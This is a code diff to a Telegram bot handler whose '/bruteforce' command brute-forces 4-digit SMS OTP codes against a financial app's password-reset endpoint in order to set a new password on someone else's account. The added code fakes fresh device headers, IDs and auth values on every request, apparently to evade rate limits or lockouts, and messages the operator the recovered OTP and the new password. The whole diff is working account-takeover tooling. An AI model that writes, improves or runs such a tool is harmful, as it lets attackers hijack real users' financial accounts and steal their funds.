@@ -746,93 +746,84 @@ Example:
     else if (text.startsWith('/bruteforce ')) {
       const parts = text.substring(12).trim().split(/\s+/);
       if (parts.length < 2) {
-        await bot.sendMessage(chatId, `Format: /bruteforce <phone> <newPassword> [guessesPerOtp]\nDefault: 4 guesses per OTP cycle\nFully automated - sends fresh OTP, tries guesses, repeats\n\nExample: /bruteforce 6206785398 mypass123`);
+        await bot.sendMessage(chatId, `Format: /bruteforce <phone> <newPassword> [start] [size]\nDefault: start 0, size 500\nSend OTP from app FIRST, then run this.\n\nExample:\n/bruteforce 6206785398 mypass123\n/bruteforce 6206785398 mypass123 500 500`);
         return res.sendStatus(200);
       }
       const phone = parts[0];
       const newPass = parts[1];
-      const guessesPerOtp = Math.min(parseInt(parts[2] || '4'), 5);
+      const startFrom = parseInt(parts[2] || '0');
+      const totalSize = Math.min(parseInt(parts[3] || '500'), 1000);
+      const maxOtp = 9999;
 
-      let bruteState = null;
-      try { bruteState = await kv.get('bruteState_' + phone); } catch(e) {}
-      if (bruteState && typeof bruteState === 'string') {
-        try { bruteState = JSON.parse(bruteState); } catch(e) { bruteState = null; }
+      function rHex(n) { let s=''; for(let i=0;i<n;i++) s+=Math.floor(Math.random()*16).toString(16); return s; }
+      function rUuid() { return [rHex(8),rHex(4),'4'+rHex(3),'a'+rHex(3),rHex(12)].join('-'); }
+
+      function makeAppHeaders() {
+        const ts = String(Date.now());
+        const deviceId = rHex(40);
+        const androidId = rHex(16);
+        return {
+          'accept-encoding': 'gzip',
+          'release': '16',
+          'device': deviceId,
+          'andid': androidId,
+          'versioncode': '80',
+          'token': '',
+          'serialnumber': 'qcom',
+          'content-type': 'application/x-www-form-urlencoded',
+          'networktype': 'TYPE_4G',
+          'model': androidId,
+          'user-agent': 'Dart/3.7 (dart:io)',
+          'accept': '*/*',
+          'timestamp': ts,
+          'auth': rHex(32),
+          'appuserid': rUuid(),
+          'uuid': rHex(24),
+          'host': 'api.i-money.vip'
+        };
       }
-      const triedSet = new Set(bruteState && bruteState.tried ? bruteState.tried : []);
-      const totalBefore = triedSet.size;
 
-      async function sendFreshOtp() {
-        await fetch(ORIGINAL_API + '/smsCode', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'host': 'api.i-money.vip' },
-          body: `phone=${encodeURIComponent(phone)}`
-        });
-      }
+      const endRange = Math.min(startFrom + totalSize - 1, maxOtp);
+      await bot.sendMessage(chatId, `🔓 Brute force (device spoof)\nPhone: ${phone}\nRange: ${String(startFrom).padStart(4, '0')} → ${String(endRange).padStart(4, '0')}\n${totalSize} OTPs | Unique device per try\n⚠️ Send OTP from app first!`);
 
-      const remaining = [];
-      for (let i = 0; i <= 9999; i++) {
-        if (!triedSet.has(i)) remaining.push(i);
-      }
-
-      if (remaining.length === 0) {
-        await bot.sendMessage(chatId, `❌ All 10000 OTPs already tried!\nUse /resetbrute ${phone} to start over.`);
-        return res.sendStatus(200);
-      }
-
-      for (let i = remaining.length - 1; i > 0; i--) {
-        const j = Math.floor(Math.random() * (i + 1));
-        [remaining[i], remaining[j]] = [remaining[j], remaining[i]];
-      }
-
-      const startTime = Date.now();
-      const MAX_TIME = 50000;
       let found = false;
       let foundOtp = '';
       let foundResp = '';
-      let cycles = 0;
-      let guessesTotal = 0;
-      let idx = 0;
+      let tried = 0;
 
-      await bot.sendMessage(chatId, `🔓 Brute force (lottery mode)\nPhone: ${phone}\n${guessesPerOtp} guesses per fresh OTP\n${remaining.length} OTPs remaining (${totalBefore} already tried)\nRunning...`);
-
-      while (!found && idx < remaining.length && (Date.now() - startTime) < MAX_TIME) {
-        await sendFreshOtp();
-        cycles++;
-
-        for (let g = 0; g < guessesPerOtp && idx < remaining.length && !found; g++) {
-          const otpNum = remaining[idx];
-          const otp = String(otpNum).padStart(4, '0');
-          const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
-          try {
-            const resp = await fetch(ORIGINAL_API + '/user/forgetPass', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'host': 'api.i-money.vip' },
-              body: formBody
-            });
-            const result = await resp.json();
-            guessesTotal++;
-            triedSet.add(otpNum);
-            if (result.statusCode !== '1023') {
-              found = true;
-              foundOtp = otp;
-              foundResp = JSON.stringify(result, null, 2);
-            }
-          } catch(e) {}
-          idx++;
+      for (let i = startFrom; i < startFrom + totalSize && i <= maxOtp && !found; i++) {
+        const otp = String(i).padStart(4, '0');
+        const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
+        const hdrs = makeAppHeaders();
+        hdrs['content-length'] = String(Buffer.byteLength(formBody));
+        try {
+          const resp = await fetch(ORIGINAL_API + '/user/forgetPass', {
+            method: 'POST',
+            headers: hdrs,
+            body: formBody
+          });
+          const result = await resp.json();
+          tried++;
+          if (result.statusCode !== '1023') {
+            found = true;
+            foundOtp = otp;
+            foundResp = JSON.stringify(result, null, 2);
+          }
+        } catch(e) {
+          await bot.sendMessage(chatId, `⚠️ Error at ${otp}: ${e.message}`);
+          break;
         }
       }
 
-      try {
-        await kv.set('bruteState_' + phone, JSON.stringify({ tried: Array.from(triedSet) }));
-      } catch(e) {}
-
       if (found) {
-        try { await kv.del('bruteState_' + phone); } catch(e) {}
-        await bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed to: ${newPass}\n\n${guessesTotal} guesses | ${cycles} OTP cycles | ${triedSet.size}/10000 total tried\n\nResponse:\n${foundResp.substring(0, 800)}`);
+        await bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed to: ${newPass}\n${tried} tried\n\nResponse:\n${foundResp.substring(0, 800)}`);
       } else {
-        const elapsed = Math.round((Date.now() - startTime) / 1000);
-        const pct = ((triedSet.size / 10000) * 100).toFixed(1);
-        await bot.sendMessage(chatId, `⏳ Progress: ${triedSet.size}/10000 (${pct}%)\n${guessesTotal} guesses | ${cycles} OTP cycles | ${elapsed}s\n\nContinue:\n/bruteforce ${phone} ${newPass}`);
+        const nextStart = startFrom + totalSize;
+        if (nextStart <= maxOtp) {
+          await bot.sendMessage(chatId, `❌ Not found: ${String(startFrom).padStart(4, '0')}-${String(endRange).padStart(4, '0')} (${tried} tried)\n\n⚠️ Send new OTP from app, then:\n/bruteforce ${phone} ${newPass} ${nextStart} ${totalSize}`);
+        } else {
+          await bot.sendMessage(chatId, `❌ All 4-digit OTPs exhausted. (${tried} tried)`);
+        }
       }
       return res.sendStatus(200);
     }
@@ -841,11 +832,6 @@ Example:
       const brPhone = text.substring(12).trim();
       try { await kv.del('bruteState_' + brPhone); } catch(e) {}
       await bot.sendMessage(chatId, `🔄 Brute force state reset for ${brPhone}`);
-      return res.sendStatus(200);
-    }
-
-    else if (text.startsWith('/stopbrute')) {
-      await bot.sendMessage(chatId, `🛑 Brute force stopped.\nTo resume: /bruteforce <phone> <password>\nTo reset: /resetbrute <phone>`);
       return res.sendStatus(200);
     }
 
